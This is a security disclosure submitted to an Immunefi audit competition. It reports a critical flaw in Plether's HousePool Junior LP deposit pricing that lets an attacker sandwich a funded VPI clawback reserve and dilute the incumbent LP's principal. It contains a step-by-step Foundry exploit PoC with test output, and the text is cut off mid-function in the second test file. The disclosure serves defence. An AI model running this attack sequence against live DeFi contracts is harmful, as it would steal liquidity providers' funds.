# \#98354 [SC-Critical] Junior LP entry omits a funded VPI clawback and diverts incumbent principal

**Submitted on Nov 7th 2026 at 08:35:31 UTC by @Ox175 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98354
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An attacker can receive a negative virtual price impact (VPI) rebate from HousePool, then activate a large Junior LP deposit while the matching, fully funded clawback reserve is held in clearinghouse custody. The new shares are minted from cash-depressed Junior principal without pricing that protected recovery. When the attacker closes the position, the reserve returns to HousePool and the new shares take part of the return. A frozen v2.0.0 Foundry reproduction uses public Router and vault entrypoints for the entire attack and ends with no attacker position, reserve, or LP shares. In its realized-principal scenario, the incumbent's claim is 1,711.946910 USDG below its contributed capital; a same-state, reserve-recognizing quote would leave it 626.007561 USDG above capital. The entrant's extra entitlement is exactly the incumbent's 2,337.954471 USDG loss, and the attacker ultimately withdraws 341.394594 USDG more than its complete 30,500,000 USDG starting wealth after normal fees and carry.

## Vulnerability Details

The incumbent owns every Junior share before the attacker enters. It supplies 10,000,000 USDG of durable Junior liquidity and owns the fixture's real 1,000 USDG Junior seed, for 10,001,000 USDG of contributed capital. An ordinary account opens a 2,500,000-notional LONG at 1.00, leaving positive LONG skew. The attacker controls a separately funded SHORT trading account and Junior LP account. The test uses the release-like 1% VPI factor, 40% skew cap, 4-bps execution fee, and 5% annual carry. In the principal-loss scenario, a valid public oracle update marks the ordinary LONG at 0.999 before the attack. The attacker's open, LP activation, close, and redemption then all use valid 0.999 data. The ordinary LONG is closed at 0.999 after the attacker closes and before the attacker redeems, making the ordinary trader's loss realized. That trader's action and result are held fixed in the ownership control.

Against the existing LONG skew, the attacker opens an equal SHORT. CfdEnginePlanLib.planOpen sets poolRebatePayoutAssets from the negative open trade cost and sets the protected reserve target to max(-vpiAccrued, 0) (packages/perps/src/libraries/CfdEnginePlanLib.sol:331-349). CfdEngineSettlementSidecar.executeOpen pays the rebate from HousePool into clearinghouse custody and locks the matching VPI reserve (packages/perps/src/CfdEngineSettlementSidecar.sol:442-478). The principal-loss run measures HousePool at 10,005,124.375124 USDG immediately before the SHORT and 10,002,007.219347 USDG after it: an exact 3,117.155777 USDG cash decrease. The account's negative lifetime VPI and its dedicated reserve both equal 3,117.155777 USDG. The cash outflow and segregated backing therefore reconcile atom for atom.

The backing is restricted. MarginClearinghouse._withdraw requires the post-withdrawal account balance to cover every locked bucket (packages/perps/src/MarginClearinghouse.sol:441-473), while _spendableActionReserveAssets subtracts the dedicated VPI amount from generic action-charge capacity (packages/perps/src/MarginClearinghouse.sol:975-984). The PoC checks that the account balance is the sum of free and locked assets and that withdrawing one atom beyond free buying power reverts. ACCOUNTING_SPEC.md:795-825 expressly says the VPI reserve is nonwithdrawable, cannot fund generic charges, and cannot be extracted by LPs before the account obligation settles. It is not freely spendable trader cash.

The attacker next requests a 30,000,000 USDG Junior deposit, waits for the normal epoch, calls public router.settleLpEpoch with valid 0.999 oracle data, and claims the shares. HousePool prices Junior deposits from juniorPrincipal and current Junior supply (packages/perps/src/HousePool.sol:914-920,1030-1048). TrancheVault.quoteDepositFromState uses that asset basis, supply, and its virtual-share rounding (packages/perps/src/TrancheVault.sol:1398-1409). The protected VPI reserve is in neither HousePool cash nor the Junior deposit price. Public settlement mints 30,007,753.576712737 attacker shares. Using the same reconciled pricing assets, supply, fee, and exact vault quote, but adding only the already funded 3,117.155777 USDG recovery to the ownership-pricing assets, would mint 29,998,401.211628930 shares. The surplus shares are the entry-pricing error.

The attacker fully closes its SHORT through router.commitOrder and router.executeOrder at 0.999. CloseAccountingLib clamps proportional lifetime VPI plus the new VPI delta so it cannot remain negative; its source comment explicitly describes this as an LP-sandwich defense (packages/perps/src/libraries/CloseAccountingLib.sol:103-118). CfdEnginePlanLib plans reserve consumption (packages/perps/src/libraries/CfdEnginePlanLib.sol:947-951,1035-1058). The settlement sidecar calls consumeVpiRebateReserve (packages/perps/src/CfdEngineSettlementSidecar.sol:690-697), and MarginClearinghouse debits the dedicated reserve and account balance before transferring real settlement tokens to HousePool (packages/perps/src/MarginClearinghouse.sol:883-906). The attacker position, lifetime VPI, and reserve all end at zero. HousePool rises from 40,002,007.219347 to 40,005,127.672610 USDG. The gross 3,120.453263 USDG rise contains the 3,117.155777 USDG reserve return and 3.297486 USDG of other close settlement; the report does not count that extra inflow as captured reserve. The ordinary LONG then closes at the same 0.999 mark and its account ends at 498,152.708629 USDG from 500,000 USDG supplied.

The documentation deliberately excludes VPI and its reserve from terminal K and symmetric NAV (packages/perps/SECURITY.md:859-872). That rule avoids treating an anticipated action charge as collectible price PnL or immediately withdrawable pool cash. The same text requires every negative lifetime VPI to have dedicated backing and says marked receivables can affect ownership pricing while remaining unavailable for redemption. This finding concerns the narrower interval after HousePool has physically paid the rebate and an equal amount has been segregated in a protected bucket. The incumbent shares funded that outflow. The lifetime clamp succeeds on its own terms in the test, yet a later cohort acquires the recovery at a price lowered by the outflow, defeating the stated LP-sandwich purpose. Ownership-only recognition or cohort attribution can preserve the conservative terminal NAV and redemption rules while preventing new shares from taking an old funded recovery.

## Impact Details

The principal-loss PoC reconciles both LP claims in one post-close state, after the ordinary LONG's loss is realized. The control substitutes only the reserve-recognizing entrant share quote. The oracle mark, ordinary LONG result, VPI depth, senior coupon, carry, fees, actual cash movements, post-close Junior asset numerator, and vault rounding formula remain fixed. The incumbent's actual claim is 9,999,288.053090 USDG. With the funded reserve recognized at entry, those same incumbent shares would claim 10,001,626.007561 USDG. The 2,337.954471 USDG difference exactly equals the entrant's additional claim under actual minting. The incumbent contributed 10,001,000 USDG: actual pricing puts it 1,711.946910 USDG below contributed principal, whereas the reserve-recognizing control leaves it 626.007561 USDG above. Thus at least 1,711.946910 USDG of the proven transfer reaches existing LP principal, not merely unclaimed yield. The ordinary trader's 1,847.291371 USDG realized loss benefits the pool but is identical on both sides of this comparison, so it cannot explain the dilution.

The attacker estate reconciles independently. Junior redemption pays 30,002,342.892080 USDG against a 30,000,000 USDG LP deposit, a 2,342.892080 USDG LP gain. The trader withdraws its entire 497,998.502514 USDG clearinghouse balance to its wallet against 500,000 USDG supplied, a 2,001.497486 USDG trading loss after ordinary charges. Both attacker accounts together hold 30,500,341.394594 USDG in wallets, a realized 341.394594 USDG net gain. This USDG profit is after protocol charges, including execution fees and carry, but before native gas and real Pyth update fees, which the PoC does not measure. The SHORT, negative lifetime VPI, reserve, Junior shares, and clearinghouse balance are all zero. The incumbent entitlement loss is larger than the attacker net profit because the attacker pays real execution fees and carry while capturing the reserve.

The companion capital-sensitivity PoC repeats the realized-loss attack through the same public entrypoints with a tested lower attacker funding amount. Its candidate supplies 30,003,286.968157 USDG to the Junior LP account and 8,487.963741 USDG to the trading account, for 30,011,774.931898 USDG of attacker-funded capital, compared with 30,500,000 USDG in the fixed benchmark. With a 2,498,900-unit SHORT and a 7,489.203301 USDG opening pledge, it records a 342.273713 USDG net attacker gain, a 2,338.018061 USDG incumbent claim loss, and the same 1,711.946910 USDG incumbent principal shortfall. This is a tested candidate meeting the benchmark's three outcome thresholds, not a proof of a global minimum. Its one-atom and trade-size controls test nearby inputs only.

The requested impact is Critical direct theft of user funds: the same-state control identifies a 1,711.946910 USDG shortfall in already contributed incumbent capital that disappears when only the funded reserve is included in the entrant ownership quote. This is a claim about a completed value transfer from existing LP backing, not a prediction that a future VPI fee will accrue. The PoC does not infer severity from the 341.394594 USDG attacker profit alone. A separate constant-price test shows the mechanism and net extraction even when the ordinary LONG never changes mark: reserve 3,123.399452 USDG, equal-and-opposite incumbent/entrant shift 2,342.491164 USDG, attacker profit 341.454151 USDG. That test's incumbent claim remains above contributed capital, so the realized-principal test provides the additional severity evidence.

Two different fixes leave the root unresolved. First, a negative control sets the senior coupon rate to zero through the normal configuration path before the attack. The public-path test still records a 2,342.491201 USDG incumbent/entrant claim shift and 341.467887 USDG attacker profit. Correcting senior-yield accrual therefore does not address the Junior entry quote. Second, the negative-VPI trade and exact reserve exist before LP entry. The test applies the original pure `CfdMath.calculateVPI` formula to the reverse close at the pre-rebate depth and asserts its charge equals that same reserve. Thus holding VPI depth at its pre-entry value would still collect the clawback. The same-state ownership control changes no trade, skew, depth, or VPI calculation; it changes only the deposit's ownership-pricing asset basis. A manipulation-resistant VPI depth could change the size of future rebates, but any positive already funded reserve would still be misassigned at entry until ownership pricing or cohort attribution is corrected.

Recommended remediation is to preserve the incumbent cohort's right to recovery of cash already paid into a dedicated VPI reserve. Include attributable protected reserves in an ownership-only Junior deposit price while excluding them from redemption liquidity and terminal price-PnL collectibility, or track the originating LP cohort and credit it on reserve consumption. Regression coverage should repeat the public Router/vault lifecycle, compare the same-state claims, and require both the ordinary coupon setting and a zero-coupon setting to preserve pre-entry reserve ownership.

## References

- Plether Perps v2.0.0 frozen competition source at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.
- packages/perps/src/libraries/CfdEnginePlanLib.sol:331-349,947-951,1035-1058.
- packages/perps/src/CfdMath.sol:142-179.
- packages/perps/src/CfdEngineSettlementSidecar.sol:442-478,690-697.
- packages/perps/src/MarginClearinghouse.sol:441-473,883-906,975-984.
- packages/perps/src/HousePool.sol:914-920,1030-1048.
- packages/perps/src/TrancheVault.sol:562-604,606-632,1398-1409,1853-1866.
- packages/perps/src/OrderRouter.sol:474-484.
- packages/perps/SECURITY.md:859-872 and packages/perps/ACCOUNTING_SPEC.md:795-825.
- Complete runnable test sources are included below: `VpiReserveLpSandwichPoC.t.sol` and `VpiReserveMinimumCapital.t.sol`. Place both side by side in `packages/perps/test/perps/spec/lp/` in the frozen checkout; the second imports and inherits the first.
- Competition scope and impact definitions: https://immunefi.com/audit-competition/plether/scope/ and https://immunefi.com/audit-competition/plether/information/.

## Proof of Concept

## Proof of Concept

Copy both complete Solidity files below into `packages/perps/test/perps/spec/lp/` in the frozen v2.0.0 Foundry checkout, preserving their filenames. The second file imports the first, so they must be in the same directory. Neither changes an in-scope contract. The fixture's existing mock USDG and Pyth components are the only test doubles. From that checkout:

    cd packages/perps
    forge test --offline --match-path test/perps/spec/lp/VpiReserveLpSandwichPoC.t.sol -vv
    forge test --offline --match-path test/perps/spec/lp/VpiReserveMinimumCapital.t.sol -vv

The file contains three tests. test_LpDepositCapturesOwnFutureNegativeVpiClawback is the constant-1.00 public-path attack. test_RealizedLongLossLeavesIncumbentPrincipalDiluted starts with the ordinary LONG at 1.00, moves to a valid 0.999 mark before the attacker opens, realizes the LONG's loss at that mark after the attacker closes, and proves that actual entry pricing transfers incumbent principal while the same-state reserve-recognizing control preserves it. test_ZeroSeniorCouponStillCapturesReserve disables the senior coupon before repeating the constant-price attack. In all three, orders use the deployed Router's V3 `commitOrder(OrderRequest)` and `executeOrder` entrypoints with valid Pyth updates; the test-only scalar commit adapter is never called. LP activation and redemption use normal request, maturity, public `router.settleLpEpoch(validPythData)`, and claim calls. The trader withdraws its full unencumbered clearinghouse balance through `withdrawMargin`, so final attacker wealth is held in wallets. No attack-stage helper impersonates the Router.

Observed focused-test output for the realized-principal scenario (six-decimal USDG atoms except share lines):

    [PASS] test_RealizedLongLossLeavesIncumbentPrincipalDiluted()
    negative lifetime VPI before LP entry: -3117155777
    protected reserve before LP entry: 3117155777
    pool before rebate: 10005124375124
    pool after rebate: 10002007219347
    pool before clawback: 40002007219347
    pool after clawback: 40005127672610
    actual entrant shares: 30007753576712737
    reserve-recognizing entrant shares: 29998401211628930
    incumbent actual claim after close: 9999288053090
    incumbent reserve-recognizing claim: 10001626007561
    incumbent loss from entry quote: 2337954471
    entrant gain from entry quote: 2337954471
    attacker LP redemption proceeds: 30002342892080
    attacker trader withdrawal: 497998502514
    ordinary trader final balance: 498152708629
    initial attacker capital: 30500000000000
    final attacker wealth: 30500341394594
    absolute attacker profit: 341394594

The same run also passed test_LpDepositCapturesOwnFutureNegativeVpiClawback with a 2,342.491164 USDG equal-and-opposite ownership shift and 341.454151 USDG net attacker profit, and test_ZeroSeniorCouponStillCapturesReserve with a 2,342.491201 USDG shift and 341.467887 USDG net profit. Suite result: 3 passed; 0 failed; 0 skipped.

The ownership control is an accounting counterfactual using the original vault's quote and conversion formulas, not a patched contract run. It recovers the exact reconciled Junior deposit basis as juniorPrincipal minus the accepted deposit, then calls quoteDepositFromState with and without the protected pre-entry reserve. At the identical post-close Junior assets it substitutes the reserve-recognizing shares into the vault's virtual-share conversion. The ordinary trader's realized loss, normal fees and carry, VPI depth, and rounding method are present on both sides. The equal-and-opposite 2,337.954471 USDG claim changes therefore isolate reserve omission. Public redemption and the final attacker estate calculation separately show that the attacker can withdraw a net profit after complete exit.

### How the two PoCs differ

`VpiReserveLpSandwichPoC.t.sol` is the fixed-parameter mechanism and impact proof. Its three tests cover a constant-price attack, the realized LONG-loss case that puts incumbent principal below contributed capital, and a zero-senior-coupon control. It explicitly checks that the funded reserve is locked, that the entrant's extra claim reconciles with the incumbent's loss, and that both attacker accounts fully exit with wallet profit.

`VpiReserveMinimumCapital.t.sol` inherits that fixture and its three tests. Each of its own tests calls `measureRealizedFresh` for one complete realized-loss cycle while varying the Junior deposit, SHORT size, trader funding, or opening pledge. `test_OneCycleReportBenchmark` reproduces the report's fixed benchmark; `test_OneCycleMinimumCandidate` checks the lower-capital candidate stated above. `test_OneCycleConfigured` permits a separate run with `VPI_LP`, `VPI_SIZE`, `VPI_TRADER`, and `VPI_PLEDGE`. The remaining tests check one-atom reductions in the candidate's deposit, trader funding, and pledge, and compare a smaller SHORT and larger LP deposit. The one-atom funding and pledge tests catch a revert from the complete public-path measurement; they do not identify a specific revert reason or establish a universal funding minimum. The new measurement records elapsed time from just before the attacker SHORT opens through final withdrawal, rather than a separately measured capital lock duration. Its `peakCapital` is the sum funded by the two attacker accounts and excludes the independent incumbent and ordinary-trader fixture capital.

I ran both files together with `forge test --offline --match-path 'test/perps/spec/lp/VpiReserve*.t.sol' -vv` in the frozen v2.0.0 checkout: 14 tests passed, 0 failed, and 0 skipped. The second file's 11 runs include the three inherited tests. Selected observed output for the lower-capital candidate follows; amounts other than SHORT size are six-decimal USDG atoms:

    [PASS] test_OneCycleMinimumCandidate()
    LP deposit atoms: 30003286968157
    SHORT size 18 decimals: 2498900000000000000000000
    trader capital atoms: 8487963741
    peak capital atoms: 30011774931898
    funded reserve atoms: 3117155174
    incumbent actual claim atoms: 9999288053090
    incumbent fair claim atoms: 10001626071151
    incumbent same-state claim loss atoms: 2338018061
    incumbent principal loss atoms: 1711946910
    net attacker gain atoms: 342273713
    capital commitment seconds: 10798

### Complete PoC source: VpiReserveLpSandwichPoC.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

contract VpiReserveLpSandwichPoCTest is BasePerpTest {
    address internal constant DURABLE_LP = address(0xD00);
    address internal constant ORDINARY_LONG_TRADER = address(0xB001);
    address internal constant ATTACKER_TRADER = address(0xA771);
    address internal constant ATTACKER_LP = address(0xA770);

    uint256 internal constant DURABLE_CAPITAL = 10_000_000e6;
    uint256 internal constant ATTACKER_LP_CAPITAL = 30_000_000e6;
    uint256 internal constant ATTACKER_TRADER_CAPITAL = 500_000e6;
    uint256 internal constant POSITION_SIZE = 2_500_000e18;

    struct OwnershipControl {
        uint256 incumbentShares;
        uint256 actualQuote;
        uint256 fairQuote;
        uint256 actualIncumbentClaim;
        uint256 fairIncumbentClaim;
        uint256 actualEntrantClaim;
        uint256 fairEntrantClaim;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _juniorSeedReceiver() internal pure override returns (address) {
        return DURABLE_LP;
    }

    function test_LpDepositCapturesOwnFutureNegativeVpiClawback() public {
        _runAttack(1e8, false);
    }

    function test_RealizedLongLossLeavesIncumbentPrincipalDiluted() public {
        _runAttack(99_900_000, true);
    }

    function test_ZeroSeniorCouponStillCapturesReserve() public {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.seniorRateBps = 0;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        router.updateMarkPrice(_mockPythUpdateData(1e8));
        pool.finalizePoolConfig();
        assertEq(pool.seniorRateBps(), 0, "negative control disables senior yield");
        _runAttack(1e8, false);
    }

    function _runAttack(uint256 attackPrice, bool realizeOrdinaryLongLoss) internal {
        _fundJuniorThroughRouter(DURABLE_LP, DURABLE_CAPITAL);
        _fundTrader(ORDINARY_LONG_TRADER, 500_000e6);
        _fundTrader(ATTACKER_TRADER, ATTACKER_TRADER_CAPITAL);

        _executeOrder(ORDINARY_LONG_TRADER, CfdTypes.Side.LONG, POSITION_SIZE, 100_000e6, false, 1e8);
        if (realizeOrdinaryLongLoss) {
            router.updateMarkPrice(_mockPythUpdateData(attackPrice));
        }
        uint256 poolBeforeRebate = pool.totalAssets();
        _executeOrder(ATTACKER_TRADER, CfdTypes.Side.SHORT, POSITION_SIZE, 100_000e6, false, attackPrice);
        uint256 poolAfterRebate = pool.totalAssets();

        (,,,,,, int256 attackerVpiBeforeLpEntry) = engine.positions(ATTACKER_TRADER);
        uint256 reserveBeforeLpEntry = clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER);
        assertLt(attackerVpiBeforeLpEntry, 0, "attacker open must receive negative lifetime VPI");
        assertEq(reserveBeforeLpEntry, uint256(-attackerVpiBeforeLpEntry), "rebate must remain fully reserved");
        assertEq(poolBeforeRebate - poolAfterRebate, reserveBeforeLpEntry, "pool cash out equals funded reserve");
        uint256 preExistingSkewAssets = POSITION_SIZE * attackPrice / 1e20;
        assertEq(
            CfdMath.calculateVPI(0, preExistingSkewAssets, poolBeforeRebate, 0.01e18),
            int256(reserveBeforeLpEntry),
            "fixed pre-rebate depth would still claw back the same reserve"
        );
        assertGe(
            clearinghouse.actionReserveAssets(ATTACKER_TRADER), reserveBeforeLpEntry,
            "protected reserve must be locked in clearinghouse custody"
        );
        uint256 freeSettlement = clearinghouse.getFreeBuyingPowerAssets(ATTACKER_TRADER);
        assertEq(
            clearinghouse.balanceAssets(ATTACKER_TRADER),
            freeSettlement + clearinghouse.lockedMarginAssets(ATTACKER_TRADER),
            "reserve is part of locked settlement, not withdrawable cash"
        );
        vm.prank(ATTACKER_TRADER);
        vm.expectRevert();
        clearinghouse.withdrawMargin(freeSettlement + 1);

        OwnershipControl memory ownership;
        ownership.incumbentShares = juniorVault.balanceOf(DURABLE_LP);
        assertEq(ownership.incumbentShares, juniorVault.totalSupply(), "incumbent owns every pre-entry share");

        settlementToken.mint(ATTACKER_LP, ATTACKER_LP_CAPITAL);
        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), ATTACKER_LP_CAPITAL);
        uint256 depositRequestId = juniorVault.requestDeposit(ATTACKER_LP_CAPITAL, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(depositRequestId));
        uint256 pricingSupply = juniorVault.accruedTotalSupply();
        router.settleLpEpoch(_mockPythUpdateData(attackPrice));
        vm.prank(ATTACKER_LP);
        uint256 attackerShares = juniorVault.claimDepositShares(depositRequestId);
        uint256 pricingAssets = pool.juniorPrincipal() - ATTACKER_LP_CAPITAL;
        ownership.actualQuote = juniorVault.quoteDepositFromState(ATTACKER_LP_CAPITAL, pricingAssets, pricingSupply, 0);
        ownership.fairQuote = juniorVault.quoteDepositFromState(
            ATTACKER_LP_CAPITAL, pricingAssets + reserveBeforeLpEntry, pricingSupply, 0
        );
        assertEq(attackerShares, ownership.actualQuote, "public activation must use the reserve-excluding quote");
        assertLt(ownership.fairQuote, attackerShares, "recognizing funded recovery must mint fewer shares");

        uint256 poolBeforeClawback = pool.totalAssets();

        _executeOrder(ATTACKER_TRADER, CfdTypes.Side.SHORT, POSITION_SIZE, 0, true, attackPrice);
        (uint256 attackerSizeAfter,,,,,, int256 attackerVpiAfter) = engine.positions(ATTACKER_TRADER);
        assertEq(attackerSizeAfter, 0, "attacker trading position fully closed");
        assertEq(attackerVpiAfter, 0, "negative lifetime VPI fully clawed back");
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER_TRADER), 0, "reserve consumed on close");
        uint256 poolAfterClawback = pool.totalAssets();
        assertGe(poolAfterClawback - poolBeforeClawback, reserveBeforeLpEntry, "clawback restores all reserved cash");
        if (realizeOrdinaryLongLoss) {
            _executeOrder(ORDINARY_LONG_TRADER, CfdTypes.Side.LONG, POSITION_SIZE, 0, true, attackPrice);
            (uint256 ordinarySizeAfter,,,,,,) = engine.positions(ORDINARY_LONG_TRADER);
            assertEq(ordinarySizeAfter, 0, "ordinary trader loss must be realized before principal comparison");
            assertLt(
                clearinghouse.balanceAssets(ORDINARY_LONG_TRADER), 500_000e6,
                "ordinary trader loses despite incumbent principal impairment"
            );
        }

        uint256 actualSupply = juniorVault.accruedTotalSupply();
        uint256 fairSupply = actualSupply - attackerShares + ownership.fairQuote;
        uint256 postCloseJuniorAssets = juniorVault.totalAssets();
        ownership.actualIncumbentClaim = juniorVault.convertToAssets(ownership.incumbentShares);
        ownership.fairIncumbentClaim =
            Math.mulDiv(ownership.incumbentShares, postCloseJuniorAssets + 1, fairSupply + 1000);
        ownership.actualEntrantClaim = juniorVault.convertToAssets(attackerShares);
        ownership.fairEntrantClaim = Math.mulDiv(ownership.fairQuote, postCloseJuniorAssets + 1, fairSupply + 1000);
        assertGt(ownership.fairIncumbentClaim, ownership.actualIncumbentClaim, "incumbent claim is diluted");
        if (realizeOrdinaryLongLoss) {
            assertLt(
                ownership.actualIncumbentClaim, DURABLE_CAPITAL + 1000e6,
                "actual incumbent claim must fall below contributed capital"
            );
            assertGt(
                ownership.fairIncumbentClaim, DURABLE_CAPITAL + 1000e6,
                "reserve-recognizing control must preserve incumbent principal"
            );
        }
        assertGt(ownership.actualEntrantClaim, ownership.fairEntrantClaim, "entrant receives diluted value");
        assertApproxEqAbs(
            ownership.fairIncumbentClaim - ownership.actualIncumbentClaim,
            ownership.actualEntrantClaim - ownership.fairEntrantClaim,
            2,
            "same-state ownership control must reconcile both sides"
        );

        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.prank(ATTACKER_LP);
        uint256 requestId = juniorVault.requestRedeem(attackerShares, ATTACKER_LP, ATTACKER_LP);
        vm.warp(juniorVault.depositEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(attackPrice));
        uint256 claimableShares = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 redeemedAssets = juniorVault.claimRedeem(requestId, claimableShares, ATTACKER_LP, ATTACKER_LP);
        assertEq(juniorVault.balanceOf(ATTACKER_LP), 0, "attacker exits all LP shares");

        assertEq(clearinghouse.lockedMarginAssets(ATTACKER_TRADER), 0, "trader has no remaining reserve");
        uint256 traderFinalBalance = clearinghouse.balanceAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdrawMargin(traderFinalBalance);
        assertEq(clearinghouse.balanceAssets(ATTACKER_TRADER), 0, "trader account fully withdrawn");
        uint256 finalWealth = settlementToken.balanceOf(ATTACKER_LP) + settlementToken.balanceOf(ATTACKER_TRADER);
        uint256 initialCapital = ATTACKER_LP_CAPITAL + ATTACKER_TRADER_CAPITAL;
        emit log_named_int("negative lifetime VPI before LP entry", attackerVpiBeforeLpEntry);
        emit log_named_uint("protected reserve before LP entry", reserveBeforeLpEntry);
        emit log_named_uint("pool before rebate", poolBeforeRebate);
        emit log_named_uint("pool after rebate", poolAfterRebate);
        emit log_named_uint("pool before clawback", poolBeforeClawback);
        emit log_named_uint("pool after clawback", poolAfterClawback);
        emit log_named_uint("actual entrant shares", attackerShares);
        emit log_named_uint("reserve-recognizing entrant shares", ownership.fairQuote);
        emit log_named_uint("incumbent actual claim after close", ownership.actualIncumbentClaim);
        emit log_named_uint("incumbent reserve-recognizing claim", ownership.fairIncumbentClaim);
        emit log_named_uint("incumbent loss from entry quote", ownership.fairIncumbentClaim - ownership.actualIncumbentClaim);
        emit log_named_uint("entrant gain from entry quote", ownership.actualEntrantClaim - ownership.fairEntrantClaim);
        emit log_named_uint("attacker LP redemption proceeds", redeemedAssets);
        emit log_named_uint("attacker trader withdrawal", traderFinalBalance);
        emit log_named_uint("ordinary trader final balance", clearinghouse.balanceAssets(ORDINARY_LONG_TRADER));
        emit log_named_uint("initial attacker capital", initialCapital);
        emit log_named_uint("final attacker wealth", finalWealth);
        if (finalWealth >= initialCapital) {
            emit log_named_uint("absolute attacker profit", finalWealth - initialCapital);
        } else {
            emit log_named_uint("absolute attacker loss", initialCapital - finalWealth);
        }
        assertGt(finalWealth, initialCapital, "clawback sandwich must be absolutely profitable");
    }

    function _executeOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = isClose ? (side == CfdTypes.Side.LONG ? type(uint256).max : 1) : price;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(block.timestamp + 120);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
        router.executeOrder(orderId, _mockPythUpdateData(price));
    }

    function _fundJuniorThroughRouter(address lp, uint256 amount) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "public LP activation must finalize the deposit");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
        assertGt(shares, 0, "LP must receive shares before the next attack stage");
    }
}
```

### Complete PoC source: VpiReserveMinimumCapital.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {VpiReserveLpSandwichPoCTest} from "./VpiReserveLpSandwichPoC.t.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice One complete public-entrypoint attack cycle per test invocation.
/// Copy this file beside VpiReserveLpSandwichPoC.t.sol in the frozen checkout.
contract VpiReserveMinimumCapitalTest is VpiReserveLpSandwichPoCTest {

    uint256 private constant LONG_SIZE = 2_500_000e18;
    uint256 private constant REALIZED_PRICE = 99_900_000;
    uint256 private constant REPORT_GAIN = 341_394_594;
    uint256 private constant REPORT_CLAIM_LOSS = 2_337_954_471;
    uint256 private constant REPORT_PRINCIPAL_LOSS = 1_711_946_910;
    uint256 private constant CANDIDATE_LP = 30_003_286_968_157;
    uint256 private constant CANDIDATE_SHORT = 2_498_900e18;
    uint256 private constant CANDIDATE_TRADER = 8_487_963_741;
    uint256 private constant CANDIDATE_PLEDGE = 7_489_203_301;

    struct Measure {
        uint256 lpDeposit;
        uint256 existingLongSize;
        uint256 positionSize;
        uint256 traderCapital;
        uint256 reserve;
        uint256 actualShares;
        uint256 fairShares;
        uint256 incumbentActualClaim;
        uint256 incumbentFairClaim;
        uint256 incumbentClaimLoss;
        uint256 lpProceeds;
        uint256 traderProceeds;
        uint256 elapsedSeconds;
        uint256 peakCapital;
        int256 traderExpense;
        int256 netGain;
    }

    struct RealizedMeasure {
        Measure cycle;
        uint256 incumbentPrincipalLoss;
        uint256 ordinaryTraderLoss;
        uint256 preRebatePoolDepth;
        uint256 entryPricingAssets;
        uint256 incumbentShares;
        uint256 postCloseJuniorAssets;
    }

    /// @dev Fresh call frame reads the current timestamp after an epoch warp.
    /// The inherited helper commits and executes through the public Router.
    function executeAtCurrentTime(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) external {
        _executeOrder(account, side, size, margin, isClose, price);
    }

    /// @dev The external boundary lets a failed public action revert atomically.
    /// No storage is edited except through the inherited Router/vault helpers.
    /// @notice Run one full realized-principal attack and return separate ledgers.
    function measureRealizedFresh(
        uint256 lp,
        uint256 shortSize,
        uint256 traderCapital,
